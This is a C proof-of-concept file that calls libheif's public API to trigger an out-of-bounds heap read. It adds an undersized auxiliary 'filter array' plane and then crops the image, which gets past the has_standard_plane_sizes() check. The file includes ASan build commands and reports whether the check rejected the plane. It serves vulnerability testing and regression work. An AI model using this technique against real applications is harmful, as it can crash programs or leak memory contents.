// Residual OOB PoC for has_standard_plane_sizes() gate bypass.
//
// Drives the public libheif C API end-to-end:
//   heif_image_create + heif_image_add_plane (documented: a plane may be
//   smaller than the image) to build an RGB image that also carries a small
//   auxiliary "filter array" data plane, then heif_image_crop().
//
// crop() first validates plane geometry via has_standard_plane_sizes(). On a
// correct tree the undersized filter_array plane makes that gate return false
// and crop() returns heif_error_Unsupported_feature (no memory touched). When
// the gate wrongly accepts the plane, crop() copies it row by row using the
// full image height, reading far past the small plane's allocation.
//
// Build:
//   cc -I libheif/api -I build-asan/libheif pocs/residual.c \
//      -o /tmp/residual -Lbuild-asan/libheif -lheif -fsanitize=address
//   LD_LIBRARY_PATH=build-asan/libheif /tmp/residual

#include <libheif/heif.h>
#include <stdio.h>

int main(void)
{
  const int W = 256, H = 256;

  heif_image* img = NULL;
  heif_error err = heif_image_create(W, H, heif_colorspace_RGB, heif_chroma_444, &img);
  if (err.code != heif_error_Ok) { fprintf(stderr, "create: %s\n", err.message); return 2; }

  // Full-size colour planes.
  heif_image_add_plane(img, heif_channel_R, W, H, 8);
  heif_image_add_plane(img, heif_channel_G, W, H, 8);
  heif_image_add_plane(img, heif_channel_B, W, H, 8);

  // Auxiliary data plane that is deliberately much shorter than the image.
  // This is a legal add_plane() call (the API documents that a plane's size
  // may be smaller than the parent image).
  heif_image_add_plane(img, heif_channel_filter_array, W, 2, 8);

  // Crop with zero margins == keep the whole image. crop() iterates every
  // plane, including filter_array, and copies H rows from each source plane.
  err = heif_image_crop(img, 0, 0, 0, 0);
  if (err.code != heif_error_Ok) {
    // Correct behaviour: the geometry gate rejected the inconsistent plane.
    fprintf(stderr, "crop rejected (expected on a fixed tree): %s\n", err.message);
    heif_image_release(img);
    return 0;
  }

  fprintf(stderr, "crop succeeded (gate bypassed)\n");
  heif_image_release(img);
  return 0;
}
